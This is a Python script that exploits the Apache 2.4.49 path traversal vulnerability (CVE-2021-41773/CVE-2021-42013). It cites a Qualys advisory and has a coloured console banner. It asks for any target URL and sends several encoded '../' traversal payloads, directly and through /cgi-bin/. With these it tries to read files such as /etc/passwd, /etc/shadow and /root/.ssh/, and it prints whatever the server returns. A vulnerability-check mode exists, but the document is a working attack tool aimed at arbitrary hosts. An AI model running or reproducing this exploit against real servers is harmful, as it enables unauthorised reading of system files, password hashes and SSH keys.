#===========================#
# I M P O R T S             #
#===========================#

import warnings
warnings.filterwarnings("ignore")

import os
import pyfiglet
import requests
import sys

#===========================#
# C O L O R S               #
#===========================#

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color") # Remove this line if you're running this on Linux

#===========================#

# Referenced from:
# - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
def exploit(url, output=True):

    paths = [
        "/etc/environment",
        "/etc/group",
        "/etc/hostname",
        "/etc/hosts",
        "/etc/networks",
        "/etc/ntp.conf",
        "/etc/os-release",
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/",
        "/usr/lib/os-release",
    ]
    
    #===========================#

    if output: print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
    print(f"| ⚔️ {bcolors.FAIL}CVE-2021-41773 / CVE-2021-42013{bcolors.ENDC} ({bcolors.ORANGE}Apache 2.4.49{bcolors.ENDC} Path Traversal)",end="")
    if output: print(f"\n"+f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
    
    #===========================#
    
    for path in paths:
        
        if output: print(f"| [{bcolors.ORANGE}"+path+f"{bcolors.ENDC}]: ",end="")

        payloads = [
            url+"/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65"+path,
            url+"/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"+path,
            url+"/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"+path,
            url+"/../../../../../../../"+path,
            url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65"+path,
            url+"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"+path,
            url+"/cgi-bin/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"+path,
            url+"/cgi-bin/../../../../../../../"+path,
        ]
        
        #------------------------------#
        
        for payload in payloads:

            try:

                r = requests.get(payload, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, allow_redirects=False, verify=False, timeout=3.0)
                
                if r.status_code == 200:

                    if output: print(f"[{bcolors.OKGREEN}"+str(r.status_code)+f"{bcolors.ENDC}]: "+r.text, end="")
                    else:
                        print(f": ❌ {bcolors.FAIL}Vulnerable{bcolors.ENDC}")
                        return
                
                elif r.status_code == 301:
                
                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Moved Permanently{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                    
                elif r.status_code == 302:
                
                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Found{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                
                elif r.status_code == 303:
                
                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" See Other{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                
                elif r.status_code == 400:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Bad Request{bcolors.ENDC}]", end="")
                
                elif r.status_code == 401:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Unauthorized{bcolors.ENDC}]", end="")
                
                elif r.status_code == 403:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Forbidden{bcolors.ENDC}]", end="")
                
                elif r.status_code == 404:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Not Found{bcolors.ENDC}]", end="")
                
                elif r.status_code == 500:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Internal Server Error{bcolors.ENDC}]", end="")
                
                else:
                
                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC}]", end="")
            
            except Exception as e:
                
                print(f"[{bcolors.FAIL}Error{bcolors.ENDC}]: "+str(e))
            
        if output: print(f"")
    
    if output: print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
    else:
        print(f": ✅ {bcolors.OKGREEN}Not Vulnerable{bcolors.ENDC}")
        return

#===========================#

if __name__ == "__main__":
    
    #===========================#
    # Banner and art.
    #===========================#
    
    print("")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    ascii_banner = pyfiglet.figlet_format("  CVE-2021-41773", font="drpepper")
    print(f"{bcolors.WARNING}" + ascii_banner + f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")

    #===========================#
    # User input.
    #===========================#

    print(f"{bcolors.OKCYAN}=" * 75 + f"{bcolors.ENDC}")
    print(f"| 🎯 {bcolors.WARNING}Target Input{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # Target input.
    domain = input(f"| Enter a [{bcolors.OKGREEN}URL{bcolors.ENDC}] to test: {bcolors.OKGREEN}")
    print(f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # If no domain was entered, exit.
    if (domain == "" or domain == " "):
    
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");
        print(f"| No domain entered. Press any key to exit.")
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");

        end = input("")
        sys.exit()
    
    # Sanitize the input.
    domain = domain.strip().lower()
    
    # If it's missing http:// or https://, add it in by default.
    if "http://" not in domain and "https://" not in domain:
        domain = "https://" + domain
        print(f"| -> Did not specify full URL, so adding [{bcolors.OKGREEN}https://{bcolors.ENDC}].")
    
    #===========================#
    
    print(f"| Testing [{bcolors.OKGREEN}"+domain+f"{bcolors.ENDC}]...")
    
    exploit(domain)